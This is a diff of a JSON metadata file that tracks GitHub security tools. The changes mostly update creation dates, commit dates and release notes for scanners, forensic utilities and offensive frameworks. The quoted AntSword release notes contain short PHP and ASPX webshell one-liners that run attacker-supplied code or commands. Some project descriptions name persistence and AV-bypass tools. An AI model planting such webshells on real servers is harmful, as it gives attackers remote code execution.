@@ -104,7 +104,7 @@
         "release_message": ""
     },
     "https://github.com/SpenserCai/GoWxDump": {
-        "created_at": "2023-02-17 10:10:37",
+        "created_at": "2023-06-15 03:49:16",
         "description": "SharpWxDump的Go语言版。微信客户端取证，获取信息(微信号、手机号、昵称)，微信聊天记录分析(Top N聊天的人、统计聊天最频繁的好友排行、关键词列表搜索等)",
         "commit_date": "2023-06-15 03:49:16",
         "commit_message": "#22",
@@ -309,8 +309,8 @@
     "https://github.com/WangYihang/UsbKeyboardDataHacker": {
         "created_at": "2017-04-04 19:13:45",
         "description": "USB键盘流量包取证工具 , 用于恢复用户的击键信息",
-        "commit_date": "2022-09-29 09:14:56",
-        "commit_message": "Merge pull request #6 from hurricane618/patch-2\n\nUpdate UsbKeyboardDataHacker.py",
+        "commit_date": "2024-04-05 15:47:37",
+        "commit_message": "Merge pull request #9 from WangYihang/dependabot/pip/pillow-10.3.0\n\nBump pillow from 10.2.0 to 10.3.0",
         "release_tag": "",
         "release_date": "",
         "release_message": ""
@@ -475,7 +475,7 @@
         "release_message": ""
     },
     "https://github.com/redtoolskobe/scaninfo": {
-        "created_at": "2021-11-05 04:59:07",
+        "created_at": "2021-11-05 06:40:25",
         "description": "fast scan for redtools",
         "commit_date": "2022-03-23 12:57:09",
         "commit_message": "Update README.md",
@@ -2048,10 +2048,10 @@
         "release_message": "This version only supports request encoding"
     },
     "https://github.com/AntSwordProject/antSword": {
-        "created_at": "2016-03-11 09:28:00",
+        "created_at": "2022-07-17 05:47:09",
         "description": "中国蚁剑是一款跨平台的开源网站管理工具。AntSword is a cross-platform website management toolkit.",
-        "commit_date": "2022-08-18 01:49:03",
-        "commit_message": "Fix(Core/PHP): fix #319",
+        "commit_date": "2023-07-15 02:53:39",
+        "commit_message": "(Fix: Modules/Database) 修正 PHP4 类型数据管理模块打不开的问题",
         "release_tag": "2.1.15",
         "release_date": "2022-07-17 05:52:54",
         "release_message": "> ❗️本次更新涉及内容较多，请仔细阅读\r\n\r\n### 核心\r\n\r\n* 修复 PHP/PHP4 当前目录不可写时 bypass open_basedir 失败的 Bug\r\n* ❗️❗️❗️ 新增 PHPRAW 类型, 该类型支持的 WebShell 类似如下代码:\r\n\r\n```php\r\n<?php eval(file_get_contents(\"php://input\"));?>\r\n```\r\n\r\n> 为了方便直连 Behinder3 WebShell, 编码器已内置。\r\n\r\n* ❗️❗️❗️新增 ASPXCSharp 类型\r\n\r\n该类型支持的 WebShell 类似如下代码:\r\n\r\n```\r\n<%@ Page Language=\"c#\"%>\r\n<%\r\n  String Payload = Request.Form[\"ant\"];\r\n  if (Payload != null)\r\n  {\r\n    System.Reflection.Assembly assembly = System.Reflection.Assembly.Load(Convert.FromBase64String(Payload));\r\n    assembly.CreateInstance(assembly.GetName().Name + \".Run\").Equals(null);\r\n  }\r\n%>\r\n```\r\n\r\n有关该类型的设计说明, 请参考[聊聊新类型ASPXCSharp](https://yzddmr6.com/posts/%E8%81%8A%E8%81%8A%E6%96%B0%E7%B1%BB%E5%9E%8BASPXCSharp/)\r\n\r\n* ❗️❗️❗️新增 PSWindows 类型，与 CMDLinux 类似\r\n\r\n> 基于命令执行的一句话类型, 仅支持 Windows 环境\r\n\r\n该类型支持的 WebShell 类似如下代码:\r\n\r\n```php\r\n<?php system($_POST[\"ant\"]);?>\r\n```\r\n\r\n有关 PSWindows 的一些注意事项和原理说明, 请参考[新类型 PSWindows 预览](https://mp.weixin.qq.com/s/tPPg4VgQH-n2O3Lnfg8lVA)\r\n\r\n* ❗️❗️❗️JSPJS 兼容各种表达式注入\r\n\r\n> 具体请看 spelbase64、el、ognl 这三个内置编码器样例, 详细请参考[Java表达式注入的武器化利用](https://mp.weixin.qq.com/s/nCvAICapO8NX--VfToLcwQ)\r\n\r\n### 数据管理\r\n\r\n* 优化了编辑 Shell 信息时，URL后缀发生改变后连动修改「连接类型」功能\r\n* 优化插件快捷设置,修正过多快捷设置后对UI影响(Fix #303)\r\n* 修复 JSP/MySQL类型在表名中有特殊字符时执行异常的 Bug (thx @powersploit)\r\n* ❗️❗️新增配置选项「Body 设置为 RAW 模式」\r\n\r\n> 勾选该选项后，只会发送 `pwd` 键下的内容，不会发送键值\r\n> 目前生效的类型有: 「PHPRAW」、「CMDLinux」、「PSWindows」、「JSPJS」\r\n\r\n主要场景如下:\r\n\r\n```\r\n// 连接类型 CMDLinux, 勾选 「Body 设置为 RAW 模式」后可连接\r\n<?php system(file_get_contents(\"php://input\"));?>\r\n```\r\n\r\n### 文件管理\r\n\r\n* ❗️新增 FileHash 计算目标文件 hash 功能\r\n\r\n> 该功能目前正在逐步适配所有类型中 , 目前已经适配 PHP/PHP4/PSWindows/CMDLinux/JSP/JSPJS\r\n\r\n### 后端模块\r\n\r\n* 支持自定义 Content-Type, 默认是 `form`\r\n\r\nsuperagent 支持的 type 简写如下, 当然也支持填写全称:\r\n\r\n```\r\nhtml: 'text/html',\r\njson: 'application/json',\r\nxml: 'text/xml',\r\nurlencoded: 'application/x-www-form-urlencoded',\r\nform: 'application/x-www-form-urlencoded',\r\nform-data: 'application/x-www-form-urlencoded'\r\n```\r\n\r\n* Fix #307\r\n* 重新规整 `modules/request.js` 代码结构\r\n* 调整 superagent `ignoreHTTPS` 注入,避免 npm upgrade之后引发问题\r\n* ❗️❗️❗️支持 WebSocket 连接\r\n\r\n> 由于 ASP/ASPX/ASPXCharp/PHP/JSP/CUSTOM 类型每次请求时为多个参数，WebSocket连接之后Server端解析会较为困难，所以当前仅支持「RAW」类型: 「PHPRAW」、「CMDLinux」、「PSWindows」、「JSPJS」,未来会支持基于 defineClass 的 JSPRAW 类型\r\n\r\n以 [wsMemShell](https://github.com/veo/wsMemShell) 项目中的 `wscmd` 为例:\r\n\r\n```\r\nURL: ws://127.0.0.1:8080/demoendpoint\r\nPWD: 随便填写\r\n连接类型: CMDLinux\r\nEncoder: default (明文, 这个是WebShell端决定的)\r\nDecoder: 根据情况自由选择\r\n```\r\n\r\n> 注意: 由于 antSword 历史设计原因，WebSocket 连接方式暂时只能每次操作都重新建立一次连接，在传输结束后自动与Server端断开\r\n\r\n\r\n### 设置模块\r\n\r\n* 优化了新增Core类型时，编码设置解析逻辑, 现在不需要再改该模块的源代码了\r\n* ❗️❗️优化全局代理设置, 代理在设置完后不需要再重启了\r\n\r\n### 其它\r\n\r\n* 更新纯真IP数据库为 2022/04/20 (https://github.com/out0fmemory/qqwry.dat)\r\n\r\n> 如需自己更新请下载后替换 `static/libs/qqwry.dat` 文件\r\n\r\n* 升级 superagent 到 6.1.0 (再高的版本需要高版本Electron支持)\r\n* 升级 superagent-proxy 到 v3.0.0\r\n"
@@ -2502,10 +2502,10 @@
         "release_message": ""
     },
     "https://github.com/rtcatc/Packer-Fuzzer": {
-        "created_at": "2020-09-30 20:21:15",
+        "created_at": "2022-06-19 15:47:07",
         "description": "Packer Fuzzer is a fast and efficient scanner for security detection of websites constructed by javascript module bundler such as Webpack. ",
-        "commit_date": "2023-01-17 09:41:54",
-        "commit_message": "v1.4.15 更新demo图片",
+        "commit_date": "2024-05-24 11:06:24",
+        "commit_message": "v1.4.16 update config",
         "release_tag": "v1.4",
         "release_date": "2022-06-19 15:49:02",
         "release_message": "- v1.4 2022/06/19\r\n\r\n  1. 修复了若干会导致扫描器异常运行的Bug;\r\n\r\n  2. 移除废弃的python扩展内容;\r\n\r\n  3. 优化了HTML报告，现可显示API返回内容长度，并可进行排序;\r\n\r\n  4. 添加了POST和GET请求切换机制；\r\n\r\n  5. 添加了Content-Type请求头的自定义功能;\r\n\r\n  6. 添加了POST请求时的数据内容自定义功能;\r\n\r\n  7. 添加了自定义Api服务器地址的功能。"
@@ -2659,8 +2659,8 @@
     "https://github.com/m4ll0k/SecretFinder": {
         "created_at": "2020-06-08 10:50:12",
         "description": "SecretFinder - A python script for find sensitive data (apikeys, accesstoken,jwt,..) and search anything on javascript files ",
-        "commit_date": "2021-06-26 07:43:14",
-        "commit_message": "Merge pull request #50 from ryansonshine/aws-access-key-fix\n\nFix for aws access key id",
+        "commit_date": "2024-05-26 09:36:41",
+        "commit_message": "Update SecretFinder.py",
         "release_tag": "",
         "release_date": "",
         "release_message": ""
@@ -2773,7 +2773,7 @@
         "release_message": ""
     },
     "https://github.com/TheKingOfDuck/burpJsEncrypter": {
-        "created_at": "2020-03-22 10:59:32",
+        "created_at": "2020-03-22 11:21:40",
         "description": "More Easier Burp Extension To Solve Javascript Front End Encryption,一款更易使用的解决前端加密问题的Burp插件。",
         "commit_date": "2020-04-15 07:01:16",
         "commit_message": "Update README.md",
@@ -2818,7 +2818,7 @@
         "release_message": ""
     },
     "https://github.com/bigsizeme/shiro-check": {
-        "created_at": "2020-06-16 07:50:19",
+        "created_at": "2021-03-15 07:23:20",
         "description": "Shiro反序列化回显利用、内存shell、检查 Burp插件",
         "commit_date": "2021-03-15 07:59:36",
         "commit_message": "shell \n\nshell",
@@ -3311,7 +3311,7 @@
         "release_message": "Version 5.1.1 of ODAT: Python 3.6 used. Oracle client version __12.2__ used.\r\nOracle client 12.2 fixes some secure connection problems to Oracle databases."
     },
     "https://github.com/4dogs-cn/TXPortMap": {
-        "created_at": "2021-03-29 02:43:30",
+        "created_at": "2021-12-10 11:35:55",
         "description": "Port Scanner & Banner Identify From TianXiang",
         "commit_date": "2021-12-10 11:35:55",
         "commit_message": "更新 项目说明",
@@ -3479,9 +3479,9 @@
         "release_message": ""
     },
     "https://github.com/Ormicron/chatViewTool": {
-        "created_at": "2022-06-16 07:51:00",
+        "created_at": "2022-06-16 07:52:19",
         "description": "基于Java实现的图形化微信聊天记录解密查看器",
-        "commit_date": "2022-06-16 08:47:41",
+        "commit_date": "2024-05-20 06:18:51",
         "commit_message": "Update README.md",
         "release_tag": "BEAT",
         "release_date": "2022-06-16 07:55:24",
@@ -3660,7 +3660,7 @@
         "release_message": ""
     },
     "https://github.com/waderwu/attackRmi": {
-        "created_at": "2020-08-31 08:40:45",
+        "created_at": "2020-10-14 08:07:36",
         "description": "attackRmi",
         "commit_date": "2020-10-14 08:07:36",
         "commit_message": "add attackRmi.jar",
@@ -3733,7 +3733,7 @@
     },
     "https://github.com/IOActive/jdwp-shellifier": {
         "created_at": "2014-04-08 14:57:53",
-        "description": "",
+        "description": null,
         "commit_date": "2017-01-14 00:36:18",
         "commit_message": "issue #6: added MIT license",
         "release_tag": "",
@@ -5151,7 +5151,7 @@
         "release_message": "1、修复Windows环境下Office Excel打开CSV文件默认ANSI编码导致乱码问题"
     },
     "https://github.com/0x727/SchTask_0x727": {
-        "created_at": "2021-08-30 03:29:34",
+        "created_at": "2021-08-30 03:29:35",
         "description": "创建隐藏计划任务，权限维持，Bypass AV",
         "commit_date": "2021-09-01 01:34:51",
         "commit_message": "Update README.md",
@@ -5465,8 +5465,8 @@
         "release_message": "## What's Changed\r\n* Adding abuse guidance from UNIX-like hosts by @ShutdownRepo in https://github.com/BloodHoundAD/BloodHound/pull/625\r\n* small typo: whisper -> whisker by @chadduffey in https://github.com/BloodHoundAD/BloodHound/pull/629\r\n* Update wording to \"acceptable\" terms by @cln-io in https://github.com/BloodHoundAD/BloodHound/pull/609\r\n* Fix Wrong Statements In Azure Post Processing setGlobalAdminHighValue & setPrivRoleAdminHighValue by @lbrauns in https://github.com/BloodHoundAD/BloodHound/pull/595\r\n* Fix edgeIncluded label partially clickable by @CravateRouge in https://github.com/BloodHoundAD/BloodHound/pull/597\r\n* Kerberoastable user with most priv query fix by @DoubtfulJerboa in https://github.com/BloodHoundAD/BloodHound/pull/606\r\n* Update sharphound.rst with up-to-date link by @Japillow in https://github.com/BloodHoundAD/BloodHound/pull/631\r\n* Remove .bin extension from instruction by @JonasBK in https://github.com/BloodHoundAD/BloodHound/pull/640\r\n* Minor Update of Neo4J Compatible Version to 4.4.19 by @kaydaskalakis in https://github.com/BloodHoundAD/BloodHound/pull/659\r\n* Added import of \"Group Types\" and \"Membership Rule\" for AZGroups by @ahazu in https://github.com/BloodHoundAD/BloodHound/pull/647\r\n* Update linux.rst - Fixed installation documentation to get correct version of neo4j by @angry-bender in https://github.com/BloodHoundAD/BloodHound/pull/622\r\n* Blood hound documentation update by @LuemmelSec in https://github.com/BloodHoundAD/BloodHound/pull/664\r\n* Contribution of the DumpSMSAPassword edge with its documentation by @simondotsh in https://github.com/BloodHoundAD/BloodHound/pull/626\r\n* 4.3.1 by @JonasBK in https://github.com/BloodHoundAD/BloodHound/pull/668\r\n\r\n## New Contributors\r\n* @ShutdownRepo made their first contribution in https://github.com/BloodHoundAD/BloodHound/pull/625\r\n* @chadduffey made their first contribution in https://github.com/BloodHoundAD/BloodHound/pull/629\r\n* @cln-io made their first contribution in https://github.com/BloodHoundAD/BloodHound/pull/609\r\n* @lbrauns made their first contribution in https://github.com/BloodHoundAD/BloodHound/pull/595\r\n* @CravateRouge made their first contribution in https://github.com/BloodHoundAD/BloodHound/pull/597\r\n* @DoubtfulJerboa made their first contribution in https://github.com/BloodHoundAD/BloodHound/pull/606\r\n* @Japillow made their first contribution in https://github.com/BloodHoundAD/BloodHound/pull/631\r\n* @kaydaskalakis made their first contribution in https://github.com/BloodHoundAD/BloodHound/pull/659\r\n* @ahazu made their first contribution in https://github.com/BloodHoundAD/BloodHound/pull/647\r\n* @angry-bender made their first contribution in https://github.com/BloodHoundAD/BloodHound/pull/622\r\n* @LuemmelSec made their first contribution in https://github.com/BloodHoundAD/BloodHound/pull/664\r\n\r\n**Full Changelog**: https://github.com/BloodHoundAD/BloodHound/compare/v4.3.0...v4.3.1"
     },
     "https://github.com/d3ckx1/OLa": {
-        "created_at": "2022-04-11 11:03:28",
-        "description": "",
+        "created_at": "2022-07-24 03:29:50",
+        "description": null,
         "commit_date": "2022-08-15 06:37:48",
         "commit_message": "Update README.md",
         "release_tag": "OLa__20220724",
@@ -7372,7 +7372,7 @@
         "release_message": ""
     },
     "https://github.com/hvqzao/burp-wildcard": {
-        "created_at": "2015-08-28 21:10:28",
+        "created_at": "2020-12-28 18:33:35",
         "description": "Burp extension intended to compact Burp extension tabs by hijacking them to own tab.",
         "commit_date": "2020-12-28 18:33:35",
         "commit_message": "Adding support to new themes",
@@ -18954,8 +18954,8 @@
     "https://github.com/NetSPI/PowerUpSQL": {
         "created_at": "2016-06-22 01:22:39",
         "description": "PowerUpSQL: A PowerShell Toolkit for Attacking SQL Server",
-        "commit_date": "2023-06-27 02:42:35",
-        "commit_message": "Create Create-FakeSensitiveData.psm1",
+        "commit_date": "2024-05-21 17:04:32",
+        "commit_message": "Update PowerUpSQL.ps1\n\nAdd optional sql link crawl to invoke-sqldumpinfo.",
         "release_tag": "",
         "release_date": "",
         "release_message": ""
@@ -23513,7 +23513,7 @@
         "release_message": "更新内容：\r\n1. 添加了新的新浪系蜜罐特征，感谢@heikanet的issue\r\n2. 完善了前端webRTC和脚本注入的状态显示逻辑，从根据配置显示变更为实时获取浏览器接口调用结果"
     },
     "https://github.com/fullhunt/log4j-scan": {
-        "created_at": "2021-12-13 03:57:50",
+        "created_at": "2022-10-20 15:35:26",
         "description": "A fully automated, accurate, and extensive scanner for finding log4j RCE CVE-2021-44228 ",
         "commit_date": "2022-10-20 15:35:26",
         "commit_message": "Merge pull request #133 from fullhunt/cve-2022-42889-1\n\nSupport for CVE-2022-42889",
@@ -23664,7 +23664,7 @@
         "release_message": "- 在macOS里进行测试,发现多种报错的情况,详细解决可以看issues,如果没解决的话可以继续提issues\r\n- 增加了macOS的外部payload\r\n- 预计下一版本添加批量检测的功能"
     },
     "https://github.com/Daybr4ak/C2ReverseProxy": {
-        "created_at": "2020-01-16 05:43:35",
+        "created_at": "2021-06-18 03:34:20",
         "description": "一款可以在不出网的环境下进行反向代理及cs上线的工具",
         "commit_date": "2023-04-26 13:16:26",
         "commit_message": "Update README.md",
@@ -24108,7 +24108,7 @@
         "release_message": ""
     },
     "https://github.com/BlackTrace/pc_wxapkg_decrypt": {
-        "created_at": "2020-08-06 08:22:08",
+        "created_at": "2020-08-06 08:30:24",
         "description": "windows pc端wxpkg文件解密（非解包）",
         "commit_date": "2020-08-06 08:30:24",
         "commit_message": "init",
@@ -26004,7 +26004,7 @@
         "release_message": "### Fuzzy detection option added [-f or --fuzzy]\r\n- Added -f or --fuzzy flag to enable fuzzy detection of partial XSS reflections in HTML source code.\r\n- Uses the FuzzyWuzzy Python library for this feature. \r\n- Additional changes include a new detect_xss() method to allow easier improvements to this feature in the future.\r\n- Flag is optional, so users who are not interested in this feature should not be impacted by these changes.\r\n### Documentation and more comments\r\n- Docstrings were added to methods and more comments were included to explain the fuzzy detection additions"
     },
     "https://github.com/stampery/mongoaudit": {
-        "created_at": "2020-05-24 00:16:40",
+        "created_at": "2016-11-24 14:43:31",
         "description": "🔥 A powerful MongoDB auditing and pentesting tool 🔥",
         "commit_message": "Update installation steps",
         "commit_date": "2020-12-02 23:31:25",
@@ -26019,10 +26019,12 @@
         "release_message": "Blisqy now supports fuzzing for Time-based Blind SQL Injection on HTTP Headers and the main functionalities (fuzzing and exploitation) separated to independent files for portability."
     },
     "https://github.com/microsoftarchive/redis": {
-        "created_at": "2012-02-09 22:49:05",
+        "created_at": "2016-07-01 13:21:27",
         "description": "Redis is an in-memory database that persists on disk. The data model is key-value, but many different kind of values are supported: Strings, Lists, Sets, Sorted Sets, Hashes",
         "commit_message": "Update README.md",
-        "commit_date": "2019-07-18 18:36:50"
+        "commit_date": "2019-07-18 18:36:50",
+        "release_date": "2016-07-01 14:05:32",
+        "release_message": "This is a critical bug fix release for Redis on Windows 3.0.\nIf you are running a previous version of 3.0 in a cluster configuration you should upgrade to 3.0.504 urgently.\nThe fix resolves a problem with the cluster fail-over procedure.\n\nThis released is based on antirez/redis 3.0.5 plus Windows-specific fixes.\n\nSee the [release notes](https://github.com/MSOpenTech/redis/blob/win-3.0.504/Redis%20on%20Windows%20Release%20Notes.md) for details.\n"
     },
     "https://github.com/UltimateSec/ultimaste-nuclei-templates": {
         "created_at": "2023-06-06 18:32:59",
@@ -27072,7 +27074,7 @@
     },
     "https://dns.aizhan.com/": {
         "status_code": 200,
-        "description": "52.234.38.242属于美国_IP反查域名_同IP站点查询_同ip网站查询_爱站网"
+        "description": "40.76.238.213属于美国_IP反查域名_同IP站点查询_同ip网站查询_爱站网"
     },
     "https://search.chongbuluo.com/": {
         "status_code": 200,
@@ -28485,5 +28487,11 @@
         "commit_date": "2021-01-05 02:28:10",
         "release_date": "2018-11-21 05:55:00",
         "release_message": "### 改进的功能\r\n* 优化完善相关功能"
+    },
+    "https://github.com/momosecurity/rhizobia_J": {
+        "created_at": "2019-05-10 10:10:48",
+        "description": "JAVA安全SDK及编码规范",
+        "commit_message": "readme",
+        "commit_date": "2019-06-20 04:09:46"
     }
 }
